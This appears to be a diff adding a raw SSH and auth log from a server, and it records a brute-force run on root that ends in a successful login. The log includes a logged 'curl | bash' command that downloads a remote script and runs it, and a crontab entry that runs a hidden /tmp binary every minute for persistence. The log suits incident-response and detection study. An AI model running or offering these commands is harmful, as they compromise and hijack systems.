@@ -1,0 +1,12 @@
+Jul 28 03:14:01 web-prod-01 sshd[2841]: Failed password for invalid user admin from 45.155.205.233 port 51422 ssh2
+Jul 28 03:14:03 web-prod-01 sshd[2843]: Failed password for invalid user oracle from 45.155.205.233 port 51488 ssh2
+Jul 28 03:14:05 web-prod-01 sshd[2845]: Failed password for invalid user postgres from 45.155.205.233 port 51502 ssh2
+Jul 28 03:14:08 web-prod-01 sshd[2847]: Failed password for root from 45.155.205.233 port 51533 ssh2
+Jul 28 03:14:11 web-prod-01 sshd[2849]: Failed password for root from 45.155.205.233 port 51560 ssh2
+Jul 28 03:14:14 web-prod-01 sshd[2851]: Failed password for root from 45.155.205.233 port 51588 ssh2
+Jul 28 03:14:19 web-prod-01 sshd[2853]: Accepted password for root from 45.155.205.233 port 51610 ssh2
+Jul 28 03:14:19 web-prod-01 sshd[2853]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Jul 28 03:15:02 web-prod-01 bash[2870]: curl -s http://194.87.144.9/x.sh | bash
+Jul 28 03:15:44 web-prod-01 sudo[2901]:     www-data : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c echo '* * * * * /tmp/.mnr' | crontab -
+Jul 28 09:02:10 web-prod-01 sshd[3301]: Accepted publickey for deploy from 10.20.4.55 port 44120 ssh2
+Jul 28 09:02:10 web-prod-01 sshd[3301]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
